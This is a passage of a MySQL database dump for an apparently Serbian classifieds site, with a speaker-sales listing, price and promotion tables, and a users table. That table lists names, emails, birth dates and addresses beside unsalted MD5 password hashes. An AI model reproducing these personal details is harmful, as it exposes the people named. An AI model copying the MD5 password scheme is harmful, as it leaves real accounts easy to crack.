(88, 'Prodajem zvucnike u perfektnom stanju', 'Plafonski zvucnici:\r\nCS 105(snaga 3w) 5 inca-6,5e\r\nCS 106(snaga 6w/3w)5 inca-10e\r\n179-6T(snaga 6w/3w)6 inca-11,5e\r\nCS 206(snaga 20w)dvopojasni 6 inca-14e\r\nCS 108k(snaga 15w) 8 inca-15e\r\nCS 306(snaga 30w/15)dvopojasni 6 inca-18e\r\nUgradni zvucnik sa zastitnom doznom(snaga 10w) 8inca-12,5e\r\n\r\nBLUETOOTH zvucnici(snaga 15w)-75e par(slika 2)\r\n\r\nNadzidni zvucnici(slika 3)\r\nHS 115k (snaga 10w)sirokopojasna zvucna kutija-12e\r\nHWR 102T(snaga 10w/5w)dvopojadna zvucna kutija-17,3e\r\nHS 215(snaga 20w/10w)dvopojasna  zvucna kutija-16e\r\nHSR 312 6T(snaga 20w/10w/5w)projekcioni zvucnik-31,5e\r\nFS 506 B(snaga 40w/8ohm)dvopojasna zvucna kutija-36e\r\nFT 305(snaga 30w)dvopojasna zvucna kutija-40e\r\nFS 504W(snaga20w/8ohm)dvopojasna vodootporna zvucna kutija-22e\r\nFS 504B(snaga 20w/8ohm)dvopojasna vodootporna zvucna kutija-22e\r\nHYB 105-4T W/B(snaga 10w)dvopojasna zvucna kutija-18e\r\nVS-440(snaga 40w) vertikalna zvucna kutija-40e\r\nHYS-940(snaga 40w) vertikalna zvucna kutija-57e\r\n\r\nViseci zvucnici u obliku lustera(snaga 10w) u beloj i crnoj varijanti-35e (slika 4,5)\r\n\r\nDekorativni bastenski zvucnici u obliku kamena(20w/10w)-50e i 65e komad(slika 6)\r\n\r\nPojacala za primenu u 100V PA sistemima(slika 7)\r\nMP-306(snaga 60w) Fm tjuner, bluetooth, audio Mp3 plejer sa USB citacem,3 zone-129e\r\nMP-510(snaga 100w)Fm tjuner, bluetooth, audio Mp3 plejer sa Usb citacem,5 zona-169e\r\nPA6120M(snaga 120w)Fm tjuner, bluetooth, audio Mp3 plejer sa Usb/SD citacem,4 zone-209e\r\nMP-518(snaga 180w)Fm tjuner, bluetooth, audio Mp3 plejer sa Usb citacem,5 zona-229e\r\nMP-536(snaga 360w)Fm tjuner, bluetooth, audio Mp3 plejer sa Usb citacem,5 zona-279e\r\nMP 550(snaga 500w)Fm tjuner, bluetooth, audio Mp5 plejer sa Usb citacem,5 zona-350e\r\n\r\nLicno preuzimanje u radnji na\r\nO. T. C Novi Beograd(buvljak)\r\nUl. Antifasisticke borbe bb\r\n1 red br.96 i 2 red br.103\r\nOd 09-16h sem ponedeljka\r\nRobu saljemo kurirskim sluzbama, postarinu placa kupac\r\nZa trenutnu dostupnost odredjenog artikla mozete proveriti na 063/83-20-658 (Sms, Viber, Whats App', 2, 5, 'user-image/1679435154829156438.jpeg', 14, '2023-03-21 21:45:54', NULL, NULL, 4, 10, 'user-image/min-1679435154.jpeg', '<iframe width=\\\"560\\\" height=\\\"315\\\" src=\\\"https://www.youtube.com/embed/z8-_llAVmAA\\\" title=\\\"YouTube video player\\\" frameborder=\\\"0\\\" allow=\\\"accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share\\\" allowfullscreen></iframe>');

--
-- Triggers `posts`
--
DELIMITER $$
CREATE TRIGGER `BEFORE_UPDATE_TRIGGER_POSTS` BEFORE UPDATE ON `posts` FOR EACH ROW SET NEW.date_updated = NOW()
$$
DELIMITER ;

-- --------------------------------------------------------

--
-- Table structure for table `prepaids`
--

CREATE TABLE `prepaids` (
  `id` int(11) NOT NULL,
  `id_user` int(11) NOT NULL,
  `prepaid` decimal(10,0) NOT NULL,
  `date_created` datetime NOT NULL DEFAULT current_timestamp()
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Dumping data for table `prepaids`
--

INSERT INTO `prepaids` (`id`, `id_user`, `prepaid`, `date_created`) VALUES
(1, 14, 8000, '2022-08-16 10:58:50'),
(4, 14, 3001, '2022-08-16 23:15:11'),
(5, 14, 1202, '2022-08-16 23:16:53'),
(6, 14, 13000, '2022-08-16 23:19:12'),
(7, 14, 6001, '2022-08-16 23:28:13'),
(8, 14, 4202, '2022-08-17 18:24:15'),
(9, 14, 2403, '2022-08-18 01:38:17'),
(10, 14, 604, '2022-08-18 01:40:43'),
(11, 23, 8000, '2022-08-18 22:40:59'),
(12, 23, 3001, '2022-08-18 22:53:31'),
(13, 23, 1202, '2022-08-18 23:35:47'),
(14, 23, 20000, '2022-08-18 23:39:38'),
(15, 23, 18201, '2022-08-18 23:40:15'),
(16, 23, 11202, '2022-08-18 23:44:58'),
(17, 23, 7203, '2022-08-19 00:15:34'),
(18, 24, 8000, '2022-08-20 14:51:43'),
(19, 24, 2501, '2022-08-20 14:55:28'),
(20, 14, 20000, '2022-08-22 11:43:05'),
(21, 14, 14501, '2022-08-22 11:45:50'),
(22, 14, 9002, '2022-08-22 12:45:57'),
(23, 14, 5503, '2022-08-22 13:00:28'),
(24, 14, 3704, '2022-08-24 20:25:17'),
(25, 14, 1905, '2022-08-24 20:38:56'),
(26, 14, 106, '2022-08-25 13:00:26'),
(28, 14, 10000, '2022-08-27 12:50:40'),
(29, 14, 15000, '2022-08-27 13:02:03'),
(30, 24, 102501, '2022-08-27 13:04:23'),
(31, 25, 8000, '2022-08-28 17:09:27'),
(32, 25, 501, '2022-08-28 18:15:25'),
(33, 25, 40501, '2022-08-28 18:20:08'),
(34, 25, 38502, '2022-08-28 18:26:34'),
(35, 25, 33003, '2022-08-28 18:43:56'),
(36, 14, 20000, '2022-08-29 00:47:25'),
(37, 14, 25000, '2022-08-29 19:42:49'),
(38, 26, 8000, '2022-09-02 09:56:25'),
(39, 28, 8000, '2022-09-03 15:16:21'),
(40, 14, 40000, '2022-09-07 23:17:25'),
(41, 14, 34001, '2022-11-12 14:21:09'),
(42, 14, 28002, '2022-11-12 14:23:40'),
(43, 14, 22003, '2022-11-12 14:26:00'),
(44, 23, 15203, '2023-01-28 01:06:17'),
(45, 14, 27003, '2023-01-28 01:06:19'),
(46, 14, 21004, '2023-03-21 21:45:54');

-- --------------------------------------------------------

--
-- Table structure for table `prices`
--

CREATE TABLE `prices` (
  `id` int(11) NOT NULL,
  `id_post` int(11) NOT NULL,
  `price` decimal(8,2) NOT NULL,
  `id_currency` int(11) NOT NULL,
  `date_created` datetime NOT NULL DEFAULT current_timestamp(),
  `date_updated` datetime DEFAULT NULL,
  `date_deleted` datetime DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Dumping data for table `prices`
--

INSERT INTO `prices` (`id`, `id_post`, `price`, `id_currency`, `date_created`, `date_updated`, `date_deleted`) VALUES
(7, 20, 1400.00, 2, '2022-08-17 18:24:15', '2022-08-28 18:05:34', NULL),
(8, 23, 0.00, 1, '2022-08-17 23:27:42', NULL, NULL),
(9, 24, 500.00, 1, '2022-08-18 01:38:17', NULL, NULL),
(10, 25, 800.00, 3, '2022-08-18 01:40:43', NULL, NULL),
(11, 26, 98.00, 3, '2022-08-18 22:31:33', NULL, NULL),
(12, 27, 1000.00, 2, '2022-08-18 22:53:31', NULL, NULL),
(14, 29, 8500.00, 2, '2022-08-18 23:37:36', NULL, NULL),
(15, 30, 800000.00, 2, '2022-08-18 23:40:15', NULL, NULL),
(16, 32, 0.00, 1, '2022-08-18 23:46:18', NULL, NULL),
(17, 33, 0.00, 1, '2022-08-18 23:46:28', NULL, NULL),
(18, 34, 0.00, 1, '2022-08-18 23:46:34', NULL, NULL),
(19, 35, 0.00, 1, '2022-08-18 23:46:41', NULL, NULL),
(20, 36, 0.00, 1, '2022-08-18 23:46:51', NULL, NULL),
(21, 37, 0.00, 1, '2022-08-18 23:46:58', NULL, NULL),
(22, 38, 0.00, 1, '2022-08-18 23:47:05', NULL, NULL),
(23, 39, 0.00, 1, '2022-08-18 23:47:12', NULL, NULL),
(24, 40, 0.00, 1, '2022-08-18 23:47:19', NULL, NULL),
(25, 41, 0.00, 1, '2022-08-18 23:47:45', NULL, NULL),
(26, 42, 0.00, 1, '2022-08-19 00:04:03', NULL, NULL),
(27, 43, 0.00, 1, '2022-08-19 00:04:14', NULL, NULL),
(28, 44, 0.00, 1, '2022-08-19 00:04:25', NULL, NULL),
(29, 45, 0.00, 1, '2022-08-19 00:04:35', NULL, NULL),
(30, 46, 0.00, 1, '2022-08-19 00:04:44', NULL, NULL),
(31, 47, 0.00, 1, '2022-08-19 00:04:53', NULL, NULL),
(32, 48, 0.00, 1, '2022-08-19 00:05:08', NULL, NULL),
(33, 49, 0.00, 1, '2022-08-19 00:09:42', NULL, NULL),
(34, 50, 0.00, 1, '2022-08-19 00:09:49', NULL, NULL),
(35, 51, 0.00, 1, '2022-08-19 00:09:58', NULL, NULL),
(36, 52, 0.00, 1, '2022-08-19 00:10:10', NULL, NULL),
(37, 53, 0.00, 1, '2022-08-19 00:10:17', NULL, NULL),
(38, 54, 0.00, 1, '2022-08-19 00:10:23', NULL, NULL),
(39, 55, 0.00, 1, '2022-08-19 00:13:24', NULL, NULL),
(40, 56, 0.00, 1, '2022-08-19 00:13:34', NULL, NULL),
(41, 57, 190000.00, 1, '2022-08-19 00:15:34', NULL, NULL),
(42, 58, 0.00, 1, '2022-08-19 00:44:41', NULL, NULL),
(43, 59, 0.00, 1, '2022-08-19 00:44:51', NULL, NULL),
(44, 25, 498.00, 2, '2022-08-20 14:13:32', NULL, NULL),
(45, 25, 498.00, 2, '2022-08-20 14:14:00', NULL, NULL),
(46, 58, 1000.00, 3, '2022-08-20 14:15:25', NULL, NULL),
(47, 60, 150000.00, 3, '2022-08-20 14:55:28', NULL, NULL),
(48, 64, 200.00, 2, '2022-08-21 14:17:08', NULL, NULL),
(49, 65, 200.00, 2, '2022-08-21 14:18:36', NULL, NULL),
(53, 67, 15000.00, 2, '2022-08-22 11:45:50', NULL, NULL),
(54, 68, 10000.00, 1, '2022-08-22 12:45:57', NULL, NULL),
(55, 69, 49998.00, 1, '2022-08-22 13:00:28', NULL, NULL),
(56, 70, 99.00, 3, '2022-08-22 13:50:35', NULL, NULL),
(57, 71, 100.00, 2, '2022-08-24 20:25:17', NULL, NULL),
(58, 72, 1500.00, 1, '2022-08-24 20:35:10', NULL, NULL),
(59, 73, 450.00, 2, '2022-08-24 20:38:56', NULL, NULL),
(60, 71, 1000.00, 2, '2022-08-24 23:28:28', NULL, NULL),
(61, 75, 17998.00, 1, '2022-08-25 13:00:26', NULL, NULL),
(62, 25, 800.00, 3, '2022-08-26 13:15:23', NULL, NULL),
(63, 25, 800.00, 3, '2022-08-26 13:15:23', NULL, NULL),
(64, 76, 349.00, 1, '2022-08-26 17:55:45', NULL, NULL),
(65, 77, 2899.00, 1, '2022-08-26 18:15:17', NULL, NULL),
(66, 68, 10000.00, 1, '2022-08-27 13:16:55', NULL, NULL),
(67, 78, 499.00, 2, '2022-08-28 18:15:25', NULL, NULL),
(68, 79, 450.00, 2, '2022-08-28 18:19:21', NULL, NULL),
(69, 80, 600.00, 2, '2022-08-28 18:26:34', NULL, NULL),
(70, 80, 600.00, 2, '2022-08-28 18:39:05', NULL, NULL),
(71, 81, 52000.00, 3, '2022-08-28 18:43:56', NULL, NULL),
(72, 82, 32000.00, 1, '2022-08-28 18:54:26', NULL, NULL),
(73, 82, 32000.00, 1, '2022-08-28 18:54:58', NULL, NULL),
(74, 82, 32000.00, 1, '2022-08-28 18:54:58', NULL, NULL),
(75, 83, 8000.00, 1, '2022-08-28 19:02:55', NULL, NULL),
(76, 70, 99.00, 3, '2022-09-02 10:22:03', NULL, NULL),
(77, 70, 99.00, 3, '2022-09-02 10:22:03', NULL, NULL),
(78, 70, 99.00, 3, '2022-09-02 10:30:46', NULL, NULL),
(79, 70, 99.00, 3, '2022-09-02 10:30:46', NULL, NULL),
(80, 70, 99.00, 3, '2022-09-02 10:34:01', NULL, NULL),
(81, 70, 99.00, 3, '2022-09-02 10:34:01', NULL, NULL),
(82, 67, 15000.00, 2, '2022-09-02 11:00:39', NULL, NULL),
(83, 67, 15000.00, 2, '2022-09-02 11:00:39', NULL, NULL),
(84, 67, 15000.00, 2, '2022-09-02 11:01:40', NULL, NULL),
(85, 67, 15000.00, 2, '2022-09-02 11:01:40', NULL, NULL),
(86, 31, 560.00, 2, '2022-09-02 11:06:52', NULL, NULL),
(87, 31, 560.00, 2, '2022-09-02 11:06:52', NULL, NULL),
(88, 25, 800.00, 3, '2022-09-02 11:07:29', NULL, NULL),
(89, 58, 3200.00, 3, '2022-09-02 11:14:02', NULL, NULL),
(90, 58, 3200.00, 3, '2022-09-02 11:14:02', NULL, NULL),
(91, 84, 32.00, 2, '2022-09-03 07:49:01', NULL, NULL),
(92, 67, 15000.00, 2, '2022-09-03 07:50:08', NULL, NULL),
(93, 85, 80.00, 3, '2022-11-12 14:21:09', NULL, NULL),
(94, 86, 129.00, 2, '2022-11-12 14:23:40', NULL, NULL),
(95, 87, 999.00, 1, '2022-11-12 14:26:00', NULL, NULL),
(96, 88, 250.00, 2, '2023-03-21 21:45:54', NULL, NULL);

--
-- Triggers `prices`
--
DELIMITER $$
CREATE TRIGGER `AFTER_UPDATE_TRIGGER_PRICES` BEFORE UPDATE ON `prices` FOR EACH ROW SET NEW.date_updated = NOW()
$$
DELIMITER ;

-- --------------------------------------------------------

--
-- Table structure for table `price_statuses`
--

CREATE TABLE `price_statuses` (
  `id` int(11) NOT NULL,
  `status` varchar(255) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Dumping data for table `price_statuses`
--

INSERT INTO `price_statuses` (`id`, `status`) VALUES
(1, 'Fixed price'),
(4, 'Gift'),
(5, 'Price - commutation\r\n');

-- --------------------------------------------------------

--
-- Table structure for table `promotions`
--

CREATE TABLE `promotions` (
  `id` int(11) NOT NULL,
  `promotion` varchar(255) NOT NULL,
  `description` varchar(255) NOT NULL,
  `price` int(11) NOT NULL,
  `day_duration` int(10) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Dumping data for table `promotions`
--

INSERT INTO `promotions` (`id`, `promotion`, `description`, `price`, `day_duration`) VALUES
(1, 'On top', 'For your category, your product will always be first!', 18999, 8),
(2, 'On top', 'For your category, your product will always be first!', 3799, 16),
(3, 'On top', 'For your category, your product will always be first', 4999, 30),
(4, 'On home page', 'Your product will always be displayed on the home page!', 2999, 8),
(5, 'On home page', 'Your product will always be displayed on the home page!', 4499, 15),
(6, 'On home page', 'Your product will always be displayed on the home page!', 5999, 30);

-- --------------------------------------------------------

--
-- Table structure for table `roles`
--

CREATE TABLE `roles` (
  `role_id` int(11) NOT NULL,
  `role` varchar(255) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Dumping data for table `roles`
--

INSERT INTO `roles` (`role_id`, `role`) VALUES
(1, 'user'),
(2, 'admin');

-- --------------------------------------------------------

--
-- Table structure for table `states`
--

CREATE TABLE `states` (
  `id` int(11) NOT NULL,
  `state` varchar(255) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Dumping data for table `states`
--

INSERT INTO `states` (`id`, `state`) VALUES
(1, 'New'),
(2, 'Like new'),
(3, 'Damaged'),
(4, 'Inoperative');

-- --------------------------------------------------------

--
-- Table structure for table `users`
--

CREATE TABLE `users` (
  `id` int(11) NOT NULL,
  `full_name` varchar(255) NOT NULL,
  `email` varchar(255) NOT NULL,
  `date_birth` date NOT NULL,
  `id_role` int(11) NOT NULL DEFAULT 1,
  `id_city` int(11) NOT NULL,
  `adress` varchar(255) NOT NULL,
  `password` varchar(255) NOT NULL,
  `active` tinyint(1) NOT NULL DEFAULT 0,
  `activation_link` varchar(255) NOT NULL,
  `src` varchar(255) NOT NULL,
  `date_created` datetime NOT NULL DEFAULT current_timestamp(),
  `date_updated` datetime DEFAULT NULL,
  `date_deleted` datetime DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Dumping data for table `users`
--

INSERT INTO `users` (`id`, `full_name`, `email`, `date_birth`, `id_role`, `id_city`, `adress`, `password`, `active`, `activation_link`, `src`, `date_created`, `date_updated`, `date_deleted`) VALUES
(14, 'Marko Dasic', 'markodasic70@gmail.com', '2001-11-15', 2, 1, 'Bulevar 118', '7047f0d776552c8e24145764756cd5ac', 1, '1090138833235408513', '../user-image/1662114999.png', '2022-08-01 01:00:00', '2022-09-02 11:00:03', NULL),
(23, 'Nikola Dasic', 'nikola@gmail.com', '1996-08-03', 1, 1, 'Bulevar Oslobodjenja 2', '7047f0d776552c8e24145764756cd5ac', 0, '12564357771779128122', 'user-image/16615105481525607991.png', '2022-07-25 10:00:00', '2023-01-28 01:06:26', NULL),
(24, 'Marko Dimitrijevic', 'bulat@gmail.com', '1943-11-19', 1, 1, 'Bulevar Oslobodjenja 200', '7047f0d776552c8e24145764756cd5ac', 0, '9241775691652178873', '../user-image/1662115274.png', '2022-08-01 21:10:00', '2023-01-28 01:06:28', NULL),
(25, 'Mika Mikic', 'mika@gmail.com', '2001-12-21', 1, 2, 'Futoska 112 A', '7047f0d776552c8e24145764756cd5ac', 1, '4990493781363957929', '../user-image/1662115196.png', '2022-08-28 17:09:27', '2022-09-02 10:40:00', NULL),
(26, 'Petar Petrovic', 'petar@gmail.com', '2001-06-17', 1, 2, 'Futoska 1', '7047f0d776552c8e24145764756cd5ac', 1, '19335897551524945546', '../user-image/1662115384.png', '2022-09-02 09:56:25', '2022-09-02 10:43:06', NULL),
(28, 'Ql Alokin', 'nikoladasic96@gmail.com', '1930-01-01', 1, 1, 'Jjzjjsjsjs', '4483802201fff01498ad8172263d290d', 0, '1770002949360123507', 'user-image/1662218149.png', '2022-09-03 15:16:21', NULL, NULL);

--
-- Triggers `users`
--
DELIMITER $$
CREATE TRIGGER `BEFORE_UPDATE_TRIGGER` BEFORE UPDATE ON `users` FOR EACH ROW SET NEW.date_updated = NOW()
$$
DELIMITER ;

--
-- Indexes for dumped tables
--

--
-- Indexes for table `categories`
--
ALTER TABLE `categories`
  ADD PRIMARY KEY (`id`),
  ADD UNIQUE KEY `category` (`category`);

--
-- Indexes for table `category_icons`
--
ALTER TABLE `category_icons`
  ADD PRIMARY KEY (`id`),
  ADD KEY `id_category` (`id_category`);

--
-- Indexes for table `cities`
--
ALTER TABLE `cities`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `currencies`
--
ALTER TABLE `currencies`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `deliveries`
--
ALTER TABLE `deliveries`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `favorites`
--
ALTER TABLE `favorites`
  ADD PRIMARY KEY (`id`),
  ADD KEY `id_user` (`id_user`),
  ADD KEY `id_post` (`id_post`);

--
-- Indexes for table `images`
--
ALTER TABLE `images`
  ADD PRIMARY KEY (`id`),
  ADD KEY `id_post` (`id_post`);

--
-- Indexes for table `invoices`
--
ALTER TABLE `invoices`
  ADD PRIMARY KEY (`id`),
  ADD KEY `id_user` (`id_user`),
  ADD KEY `id_promotion` (`id_promotion`),
  ADD KEY `id_post` (`id_post`);

--
-- Indexes for table `likes`
--
ALTER TABLE `likes`
  ADD PRIMARY KEY (`id`),
  ADD KEY `id_whom` (`id_whom`),
  ADD KEY `id_who` (`id_who`);

--
-- Indexes for table `phones`
--
ALTER TABLE `phones`
  ADD PRIMARY KEY (`id`),
  ADD KEY `id_user` (`id_user`);

--
-- Indexes for table `posts`
--
ALTER TABLE `posts`
  ADD PRIMARY KEY (`id`),
  ADD KEY `id_user` (`id_user`),
  ADD KEY `id_delivery` (`id_delivery`),
  ADD KEY `id_category` (`id_category`),
  ADD KEY `id_price_status` (`id_price_status`),
  ADD KEY `id_state` (`id_state`);

--
-- Indexes for table `prepaids`
--
ALTER TABLE `prepaids`
  ADD PRIMARY KEY (`id`),
  ADD KEY `id_user` (`id_user`);

--
-- Indexes for table `prices`
--
ALTER TABLE `prices`
  ADD PRIMARY KEY (`id`),
  ADD KEY `id_post` (`id_post`),
  ADD KEY `id_currency` (`id_currency`);

--
-- Indexes for table `price_statuses`
--
ALTER TABLE `price_statuses`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `promotions`
--
ALTER TABLE `promotions`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `roles`
--
ALTER TABLE `roles`
  ADD PRIMARY KEY (`role_id`);

--
-- Indexes for table `states`
--
ALTER TABLE `states`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `users`
--
ALTER TABLE `users`
  ADD PRIMARY KEY (`id`),
  ADD UNIQUE KEY `email` (`email`),
  ADD KEY `id_role` (`id_role`),
  ADD KEY `id_city` (`id_city`);

--
-- AUTO_INCREMENT for dumped tables
--

--
-- AUTO_INCREMENT for table `categories`
--
ALTER TABLE `categories`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=71;

--
-- AUTO_INCREMENT for table `category_icons`
--
ALTER TABLE `category_icons`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=13;

--
-- AUTO_INCREMENT for table `cities`
--
ALTER TABLE `cities`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=5;

--
-- AUTO_INCREMENT for table `currencies`
--
ALTER TABLE `currencies`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=4;

--
-- AUTO_INCREMENT for table `deliveries`
--
ALTER TABLE `deliveries`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=5;

--
-- AUTO_INCREMENT for table `favorites`
--
ALTER TABLE `favorites`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=28;

--
-- AUTO_INCREMENT for table `images`
--
ALTER TABLE `images`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=176;

--
-- AUTO_INCREMENT for table `invoices`
--
ALTER TABLE `invoices`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=27;

--
-- AUTO_INCREMENT for table `likes`
--
ALTER TABLE `likes`
  MODIFY `id` int(255) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=31;

--
-- AUTO_INCREMENT for table `phones`
--
ALTER TABLE `phones`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=62;

--
-- AUTO_INCREMENT for table `posts`
--
ALTER TABLE `posts`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=89;

--
-- AUTO_INCREMENT for table `prepaids`
--
ALTER TABLE `prepaids`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=47;

--
-- AUTO_INCREMENT for table `prices`
--
ALTER TABLE `prices`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=97;

--
-- AUTO_INCREMENT for table `price_statuses`
--
ALTER TABLE `price_statuses`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=6;

--
-- AUTO_INCREMENT for table `promotions`
--
ALTER TABLE `promotions`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=7;

--
-- AUTO_INCREMENT for table `roles`
--
ALTER TABLE `roles`
  MODIFY `role_id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=3;

--
-- AUTO_INCREMENT for table `states`
--
ALTER TABLE `states`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=5;

--
-- AUTO_INCREMENT for table `users`
--
ALTER TABLE `users`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=29;

--
-- Constraints for dumped tables
--

--
-- Constraints for table `category_icons`
--
ALTER TABLE `category_icons`
  ADD CONSTRAINT `category_icons_ibfk_1` FOREIGN KEY (`id_category`) REFERENCES `categories` (`id`);

--
-- Constraints for table `favorites`
--
ALTER TABLE `favorites`
  ADD CONSTRAINT `favorites_ibfk_1` FOREIGN KEY (`id_user`) REFERENCES `users` (`id`),
  ADD CONSTRAINT `favorites_ibfk_2` FOREIGN KEY (`id_post`) REFERENCES `posts` (`id`);

--
-- Constraints for table `images`
--
ALTER TABLE `images`
  ADD CONSTRAINT `images_ibfk_1` FOREIGN KEY (`id_post`) REFERENCES `posts` (`id`);

--
-- Constraints for table `invoices`
--
ALTER TABLE `invoices`
  ADD CONSTRAINT `invoices_ibfk_1` FOREIGN KEY (`id_user`) REFERENCES `users` (`id`),
  ADD CONSTRAINT `invoices_ibfk_2` FOREIGN KEY (`id_promotion`) REFERENCES `promotions` (`id`),
  ADD CONSTRAINT `invoices_ibfk_3` FOREIGN KEY (`id_post`) REFERENCES `posts` (`id`);

--
-- Constraints for table `likes`
--
ALTER TABLE `likes`
  ADD CONSTRAINT `likes_ibfk_1` FOREIGN KEY (`id_who`) REFERENCES `users` (`id`),
  ADD CONSTRAINT `likes_ibfk_2` FOREIGN KEY (`id_whom`) REFERENCES `users` (`id`);

--
-- Constraints for table `phones`
--
ALTER TABLE `phones`
  ADD CONSTRAINT `phones_ibfk_1` FOREIGN KEY (`id_user`) REFERENCES `users` (`id`);

--
-- Constraints for table `posts`
--
ALTER TABLE `posts`
  ADD CONSTRAINT `posts_ibfk_1` FOREIGN KEY (`id_user`) REFERENCES `users` (`id`),
  ADD CONSTRAINT `posts_ibfk_2` FOREIGN KEY (`id_delivery`) REFERENCES `deliveries` (`id`),
  ADD CONSTRAINT `posts_ibfk_3` FOREIGN KEY (`id_category`) REFERENCES `categories` (`id`),
  ADD CONSTRAINT `posts_ibfk_6` FOREIGN KEY (`id_price_status`) REFERENCES `price_statuses` (`id`),
  ADD CONSTRAINT `posts_ibfk_7` FOREIGN KEY (`id_state`) REFERENCES `states` (`id`);

--
-- Constraints for table `prepaids`
--
ALTER TABLE `prepaids`
  ADD CONSTRAINT `prepaids_ibfk_1` FOREIGN KEY (`id_user`) REFERENCES `users` (`id`);

--
-- Constraints for table `prices`
--
ALTER TABLE `prices`
  ADD CONSTRAINT `prices_ibfk_1` FOREIGN KEY (`id_post`) REFERENCES `posts` (`id`),
  ADD CONSTRAINT `prices_ibfk_2` FOREIGN KEY (`id_currency`) REFERENCES `currencies` (`id`);

--
-- Constraints for table `users`
--
ALTER TABLE `users`
  ADD CONSTRAINT `users_ibfk_1` FOREIGN KEY (`id_role`) REFERENCES `roles` (`role_id`),
  ADD CONSTRAINT `users_ibfk_2` FOREIGN KEY (`id_city`) REFERENCES `cities` (`id`);
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
